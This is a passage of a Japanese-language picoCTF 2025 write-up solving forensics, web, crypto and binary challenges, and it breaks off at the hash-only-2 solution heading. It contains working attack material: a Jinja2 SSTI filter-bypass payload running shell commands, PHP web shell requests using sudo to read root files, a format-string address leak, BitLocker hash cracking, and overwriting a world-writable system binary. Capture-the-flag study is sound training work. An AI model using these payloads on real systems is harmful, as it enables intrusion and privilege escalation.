+<p>tshark コマンドを使って、TCP Payload を取り出してみます。</p>
+<pre>
+$ tshark -r myNetworkTraffic.pcap -T fields -e "tcp.payload"
+657a46305833633063773d3d
+63476c6a62304e5552673d3d
+626e52666447673064413d3d
+5974386b734d4d3d
+337073763543343d
+595145467a49553d
+596d68664e484a664f513d3d
+6132332f5562493d
+544f47534767343d
+62707a513052383d
+66513d3d
+6e6675345677773d
+4a3461755a4d593d
+6550525844696f3d
+666a497a51776b3d
+585468477875453d
+636b426b5a4c6b3d
+434a72346f446b3d
+42674a4c4230633d
+587a4d3063336c6664413d3d
+4e546c6d4e54426b4d773d3d
+646756397630733d
+</pre>
+<p><br /><br /></p>
+<p>Base64 の Padding (3d3d、すなわち&quot;==&quot;) がついているので Base64 デコードを各行に対して行ったところ、TCP Length が 8 のものは文字列としてデコードできないようでした。</p>
+<p>ということで、フィルターを使って不要なデータを除外します。</p>
+<pre>
+$ tshark -r myNetworkTraffic.pcap -T fields -e "tcp.payload" -Y "tcp.len!=8"
+657a46305833633063773d3d
+63476c6a62304e5552673d3d
+626e52666447673064413d3d
+596d68664e484a664f513d3d
+66513d3d
+587a4d3063336c6664413d3d
+4e546c6d4e54426b4d773d3d
+</pre>
+<p><br /><br /></p>
+<p>Hint を元に、timestampも表示して、ソートします。</p>
+<pre>
+$ tshark -r myNetworkTraffic.pcap -T fields -e "frame.time" -e "tcp.payload" -Y "tcp.len!=8" | sort
+Mar  6, 2025 12:31:35.795918000 JST	63476c6a62304e5552673d3d
+Mar  6, 2025 12:31:35.796143000 JST	657a46305833633063773d3d
+Mar  6, 2025 12:31:35.796375000 JST	626e52666447673064413d3d
+Mar  6, 2025 12:31:35.796700000 JST	587a4d3063336c6664413d3d
+Mar  6, 2025 12:31:35.796941000 JST	596d68664e484a664f513d3d
+Mar  6, 2025 12:31:35.797170000 JST	4e546c6d4e54426b4d773d3d
+Mar  6, 2025 12:31:35.797392000 JST	66513d3d
+</pre>
+<p><br /><br /></p>
+<p>あとは、文字に変換するだけです。</p>
+<pre>
+$ tshark -r myNetworkTraffic.pcap -T fields -e "frame.time" -e "tcp.payload" -Y "tcp.len!=8" | sort | cut -f2 | xxd -r -p | base64 -d ; echo
+picoCTF{1t_w4snt_th4t_34sy_tbh_4r_959f50d3}
+</pre>
+<br />
+<p>Flag: <code>picoCTF{1t_w4snt_th4t_34sy_tbh_4r_959f50d3}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-flags-are-stepic-100-points">[Forensics]: flags are stepic (100 points)</h2>
+<hr>
+<h3 id="challenge-5">Challenge</h3>
+<blockquote>
+<p>A group of underground hackers might be using this legit site to communicate. Use your forensic techniques to uncover their message
+Try it here!
+<br /><br />
+Hint: In the country that doesn&rsquo;t exist, the flag persists</p>
+</blockquote>
+<br />
+<h3 id="solution-5">Solution</h3>
+<p>まずはウェブページのソースをテキストファイルに保存して、国コードのリストを取り出してみました。</p>
+<pre>
+$ grep "flags/" flags_are_stepic_source.txt | cut -d'/' -f2 | cut -d'.' -f1
+af
+ax
+al
+dz
+:
+(snip)
+:
+gb
+us
+upz  <---- !!!
+uy
+uz
+:
+</pre>
+<p><br /><br /></p>
+<p>3文字の <code>upz</code> という怪しいものがあります。</p>
+<p>その画像を見てみると（/flags/upz.png）、確かに国旗ではないようです。</p>
+<img src="https://captureamerica.github.io/writeups/img/upz.png" alt="upz.png">
+<p><br /><br /></p>
+<p>いろいろと調べてみたところ、<code>stepic</code> という Python モジュールがあることがわかり、使い方を調べて upz.png をデコードしてみました。</p>
+<br />
+<p>以下が書いたコードです。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">stepic</span>
+</span></span><span class="line"><span class="cl"><span class="n">img2</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;upz.png&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">stepic</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">img2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Decoded data : &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><br /><br /></p>
+<p>実行結果:</p>
+<pre>
+$ python3 ./stepic_decode.py
+/usr/lib/python3/dist-packages/PIL/Image.py:3218: DecompressionBombWarning: Image size (150658990 pixels) exceeds limit of 89478485 pixels, could be decompression bomb DOS attack.
+  warnings.warn(
+Decoded data : picoCTF{fl4g_h45_fl4ga664459a}
+</pre>
+<br />
+<p>Flag: <code>picoCTF{fl4g_h45_fl4ga664459a}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-event-viewing-200-points">[Forensics]: Event-Viewing (200 points)</h2>
+<hr>
+<h3 id="challenge-6">Challenge</h3>
+<blockquote>
+<p>One of the employees at your company has their computer infected by malware! Turns out every time they try to switch on the computer, it shuts down right after they log in. The story given by the employee is as follows:<br />
+They installed software using an installer they downloaded online<br />
+They ran the installed software but it seemed to do nothing<br />
+Now every time they bootup and login to their computer, a black command prompt screen quickly opens and closes and their computer shuts down instantly.<br />
+See if you can find evidence for the each of these events and retrieve the flag (split into 3 pieces) from the correct logs!
+<br /><br />
+Hint1: Try to filter the logs with the right event ID
+<br />
+Hint2: What could the software have done when it was ran that causes the shutdowns every time the system starts up?</p>
+</blockquote>
+<ul>
+<li>Windows_Logs.evtx</li>
+</ul>
+<br />
+<h3 id="solution-6">Solution</h3>
+<p>Windows PC のイベントビューアーで Windows_Logs.evtx を読み込んで調べました。</p>
+<p><br /><br /></p>
+<p>&ldquo;shutdown&rdquo; でサーチしたら Base64 エンコードされた文字列が見つかります。</p>
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_WinEvent1.png" alt="picoctf_2025_WinEvent1.png">
+<p><br /><br /></p>
+<p>残りの2つは、&quot;==&quot; でサーチして見つけました。</p>
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_WinEvent2.png" alt="picoctf_2025_WinEvent2.png">
+<br />
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_WinEvent3.png" alt="picoctf_2025_WinEvent3.png">
+<p><br /><br /></p>
+<p>Flag: <code>picoCTF{Ev3nt_vi3wv3r_1s_a_pr3tty_us3ful_t00l_81ba3fe9}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-bitlocker-1-200-points">[Forensics]: Bitlocker-1 (200 points)</h2>
+<hr>
+<h3 id="challenge-7">Challenge</h3>
+<blockquote>
+<p>Jacky is not very knowledgable about the best security passwords and used a simple password to encrypt their BitLocker drive. See if you can break through the encryption!</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>bitlocker-1.dd (100MB)</li>
+</ul>
+<br />
+<h3 id="solution-7">Solution</h3>
+<p>Kali に bitlocker2john がすでに入っていたので、それを使いました。（出力結果は省略）</p>
+<pre>
+$ bitlocker2john -i bitlocker-1.dd > hash.txt
+$ john hash.txt --wordlist=~/wordlists/rockyou.txt
+</pre>
+<br />
+<p>これで、<code>jacqueline</code> というパスワードが見つかります。</p>
+<p><br /><br /></p>
+<p>ここからは、Windows PC の AutoPsy を使いました。</p>
+<p>先ほど見つかったパスワードを使って、ファイルの中身を見ていくと、flag.txtが見つかります。</p>
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_AutoPsy.png" alt="picoctf_2025_AutoPsy.png">
+<p><br /><br /></p>
+<p>Flag: <code>picoCTF{us3_b3tt3r_p4ssw0rd5_pl5!_3242adb1}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="web-n0s4n1ty-1-100-points">[Web]: n0s4n1ty 1 (100 points)</h2>
+<hr>
+<h3 id="challenge-8">Challenge</h3>
+<blockquote>
+<p>A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.
+<br /><br />
+Hint1: File upload was not sanitized
+<br />
+Hint2: Whenever you get a shell on a remote machine, check sudo -l</p>
+</blockquote>
+<br />
+<h3 id="solution-8">Solution</h3>
+<p>サニタイズがされていないので、PHP の Web shell をアップロードして、それを使うだけです。</p>
+<p>a.phpというファイルを作ってアップロードしました。</p>
+<br />
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2025_aphp.png" alt="picoctf_2025_aphp.png">
+<p><br /><br /></p>
+<pre>
+http://standard-pizzas.picoctf.net:51712/uploads/a.php?cmd=sudo -l
+http://standard-pizzas.picoctf.net:51712/uploads/a.php?cmd=sudo cat /root/flag.txt
+</pre>
+<br />
+<p>Flag: <code>picoCTF{wh47_c4n_u_d0_wPHP_4043cda3}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="web-ssti2-200-points">[Web]: SSTI2 (200 points)</h2>
+<hr>
+<h3 id="challenge-9">Challenge</h3>
+<blockquote>
+<p>I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)<br />
+I heard templating is a cool and modular way to build web apps! Check out my website here!
+<br /><br />
+Hint1: Server Side Template Injection
+<br />
+Hint2: Why is blacklisting characters a bad idea to sanitize input?</p>
+</blockquote>
+<br />
+<h3 id="solution-9">Solution</h3>
+<p>Black list のバイパスがなかなか出来ずに結構試行錯誤をしたのですが、</p>
+<p>以下のサイトに書かれているサンプルを使ったら、そのまま行けました。</p>
+<p><a href="https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f">https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f</a></p>
+<pre>
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
+</pre>
+<br />
+<p>Flag: <code>picoCTF{sst1_f1lt3r_byp4ss_ece726e9}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="crypto-even-rsa-can-be-broken-200-points">[Crypto]: EVEN RSA CAN BE BROKEN??? (200 points)</h2>
+<hr>
+<h3 id="challenge-10">Challenge</h3>
+<blockquote>
+<p>This service provides you an encrypted flag. Can you decrypt it with just N &amp; e?<br />
+Connect to the program with netcat:
+<br /><br />
+Hint1: How much do we trust randomness?
+<br /><br />
+Hint2: Notice anything interesting about N?
+<br /><br />
+Hint3: Try comparing N across multiple requests</p>
+</blockquote>
+<br />
+<h3 id="solution-10">Solution</h3>
+<p>Hint を元に、いくつかサンプルを集めて傾向を見ることにしました。</p>
+<pre>
+$ nc verbal-sleep.picoctf.net 51624
+N: 15011597723370625970175278550446842441472820011538256365596832808503849392426362376701897544864203610415636205947277203638791695202994114239414917448991866
+e: 65537
+cyphertext: 11870742963080785358411730864105202326585637170748591243517262296319996953298655433668433818798404934888882330038339838064138913817733910471654885076976627
+
+$ nc verbal-sleep.picoctf.net 51624
+N: 24045499541871971500675444118414331087201949280013008187969606893273730814495825624003150534117378982230294289676472858760526590191230465510897306998995534
+e: 65537
+cyphertext: 7975568915660088048579382997740376222901530549289757566064178450599924360171059171558200074021506539392061315001920794734320484943667743626436550719451927
+
+$ nc verbal-sleep.picoctf.net 51624
+N: 16999973870731977513276050547205289068142526016621272648326617590290000339331066413392966316011818246740851947973819144108569306513299866015339056450949774
+e: 65537
+cyphertext: 388354100763543080756460793652936406970160745126018474654530311167072472380674234633242076264308040359526728177861105960472223146033383052669759985398571
+</pre>
+<br />
+<p>N を factorize してみて分かったことは、pかqかの必ずどちらかが2になっている、ということでした。</p>
+<br />
+<p>以下が書いたコードです。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="hl"><span class="lnt">10
+</span></span><span class="hl"><span class="lnt">11
+</span></span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">math</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">inverse</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># RSA Data</span>
+</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">15011597723370625970175278550446842441472820011538256365596832808503849392426362376701897544864203610415636205947277203638791695202994114239414917448991866</span>
+</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="mi">11870742963080785358411730864105202326585637170748591243517262296319996953298655433668433818798404934888882330038339838064138913817733910471654885076976627</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Solve for p,q</span>
+</span></span><span class="line hl"><span class="cl"><span class="n">q</span> <span class="o">=</span> <span class="mi">2</span>
+</span></span><span class="line hl"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">n</span> <span class="o">//</span> <span class="n">q</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Standard RSA</span>
+</span></span><span class="line"><span class="cl"><span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">phi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="nb">format</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span></span></span></code></pre></td></tr></table>
+</div>
+</div>
+<br />
+<p>Flag: <code>picoCTF{tw0_1$_pr!m378257f39}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="binary-exploitation-pie-time-75-points">[Binary Exploitation]: PIE TIME (75 points)</h2>
+<hr>
+<h3 id="challenge-11">Challenge</h3>
+<blockquote>
+<p>Can you try to get the flag? Beware we have PIE!
+Additional details will be available after launching your challenge instance.
+<br /><br />
+Hint: Can you figure out what changed between the address you found locally and in the server output?</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>vuln (ELF 64-bit)</li>
+<li>vuln.c</li>
+</ul>
+<br />
+<h3 id="solution-11">Solution</h3>
+<p>まずは、実行して動きをみてみます。</p>
+<pre>
+$ nc rescued-float.picoctf.net 55539
+Address of main: 0x5c34e296d33d
+Enter the address to jump to, ex => 0x12345:
+
+</pre>
+<br />
+<p>main()関数のアドレスが表示され、その後、任意のアドレスを入れると、そこに飛んでくれるようになっています。</p>
+<br />
+<p>ソースコードを見ると、win()関数が用意されていて、gdbを使ってmain()関数とwin()関数とのアドレスの差分を見ると -0x96 でした。</p>
+<p><br /><br /></p>
+<p>ということで、</p>
+<pre>
+$ nc rescued-float.picoctf.net 55539
+Address of main: 0x5c34e296d33d
+Enter the address to jump to, ex => 0x12345: 0x5c34e296d2a7
+Your input: 5c34e296d2a7
+You won!
+picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_31cc212b}
+</pre>
+<br />
+<p>Flag: <code>picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_31cc212b}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="binary-exploitation-pie-time-2-200-points">[Binary Exploitation]: PIE TIME 2 (200 points)</h2>
+<hr>
+<h3 id="challenge-12">Challenge</h3>
+<blockquote>
+<p>Can you try to get the flag? I&rsquo;m not revealing anything anymore!!
+<br /><br />
+Hint1: What vulnerability can be exploited to leak the address?
+<br />
+Hint2: Please be mindful of the size of pointers in this binary</p>
+</blockquote>
+<ul>
+<li>vuln (ELF 64-bit)</li>
+<li>vuln.c</li>
+</ul>
+<p>以下が中身</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="hl"><span class="lnt">15
+</span></span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">segfault_handler</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Segfault Occurred, incorrect address.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">call_functions</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter your name:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line hl"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">val</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34; enter the address to jump to, ex =&gt; 0x12345: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%lx&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">val</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">foo</span><span class="p">)(</span><span class="kt">void</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">val</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">foo</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">FILE</span> <span class="o">*</span><span class="n">fptr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You won!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Open file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">fptr</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fptr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Cannot open file.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// Read contents from file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">c</span> <span class="o">=</span> <span class="nf">fgetc</span><span class="p">(</span><span class="n">fptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="n">c</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">printf</span> <span class="p">(</span><span class="s">&#34;%c&#34;</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">c</span> <span class="o">=</span> <span class="nf">fgetc</span><span class="p">(</span><span class="n">fptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fclose</span><span class="p">(</span><span class="n">fptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">signal</span><span class="p">(</span><span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">segfault_handler</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// _IONBF = Unbuffered
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">call_functions</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div>
+<br />
+<h3 id="solution-12">Solution</h3>
+<p>上記ソースコードのハイライトしているところで、書式文字列攻撃ができます。</p>
+<br />
+<p>gdbで解きました。</p>
+<p>M1 Mac上で動かしている VMWare の Ubuntu では結果が異なってしまって解けなかったので、別のPCを使いました。</p>
+<br />
+<p>gdbでwin()関数のアドレスを確認しつつ、%14$p から順番に、%15$p、%16$p、と試していったら、%19$p を入れたときにwin()関数のアドレスと近い値を発見できました。</p>
+<p>かつ、アドレスの差分が常に固定 (0xd7) であったため、これを使いました。</p>
+<pre>
+$ nc rescued-float.picoctf.net 50119
+Enter your name:%19$p
+0x55ef63fcd441
+ enter the address to jump to, ex => 0x12345: 0x55ef63fcd36a
+You won!
+picoCTF{p13_5h0u1dn'7_134k_e7fc8501}
+</pre>
+<br />
+<p>Flag: <code>picoCTF{p13_5h0u1dn'7_134k_e7fc8501}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="binary-exploitation-hash-only-1-100-points">[Binary Exploitation]: hash-only-1 (100 points)</h2>
+<hr>
+<h3 id="challenge-13">Challenge</h3>
+<blockquote>
+<p>Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!<br />
+Connect using ssh <a href="mailto:ctf-player@shape-facility.picoctf.net">ctf-player@shape-facility.picoctf.net</a> -p 62974 with the password, a15d25e1 and run the binary named &ldquo;flaghasher&rdquo;.<br />
+You can get a copy of the binary if you wish: scp -P 62974 <a href="mailto:ctf-player@shape-facility.picoctf.net">ctf-player@shape-facility.picoctf.net</a>:~/flaghasher .</p>
+</blockquote>
+<br />
+<h3 id="solution-13">Solution</h3>
+<p>まずはSSHをして、動きを見てみます。ホームディレクトリに flaghasher というバイナリファイルがあり、実行すると /root/flag.txt の md5値を出してくれます。</p>
+<pre>
+ctf-player@pico-chall$ ls -al
+total 24
+drwxr-xr-x 1 ctf-player ctf-player    20 Mar 13 08:10 .
+drwxr-xr-x 1 root       root          24 Mar  6 03:44 ..
+drwx------ 2 ctf-player ctf-player    34 Mar 13 08:10 .cache
+-rw-r--r-- 1 root       root          67 Mar  6 03:45 .profile
+-rwsr-xr-x 1 root       root       18312 Mar  6 03:45 flaghasher
+
+ctf-player@pico-chall$ ./flaghasher
+Computing the MD5 hash of /root/flag.txt....
+</pre>
+<p><br /><br /></p>
+<p>md5sumのパーミッションを見たら、上書きが可能でした。</p>
+<pre>
+ctf-player@pico-chall$ ls -al /usr/bin/md5sum
+-rwxrwxrwx 1 root root 47480 Sep  5  2019 /usr/bin/md5sum
+</pre>
+<p><br /><br /></p>
+<p>ということで、cat コマンドを md5sum コマンドとして上書きしちゃいます。</p>
+<pre>
+ctf-player@pico-chall$ cp /usr/bin/cat /usr/bin/md5sum
+
+ctf-player@pico-chall$ ./flaghasher
+Computing the MD5 hash of /root/flag.txt....
+
+picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_cc661106}
+</pre>
+<br />
+<p>Flag: <code>picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_cc661106}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="binary-exploitation-hash-only-2-200-points">[Binary Exploitation]: hash-only-2 (200 points)</h2>
+<hr>
+<h3 id="challenge-14">Challenge</h3>
+<blockquote>
+<p>Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content! <br />
+Connect using ssh <a href="mailto:ctf-player@rescued-float.picoctf.net">ctf-player@rescued-float.picoctf.net</a> -p 53489 with the password, 83dcefb7 and run the binary named &ldquo;flaghasher&rdquo;.</p>
+</blockquote>
+<br />
+<h3 id="solution-14">Solution</h3>
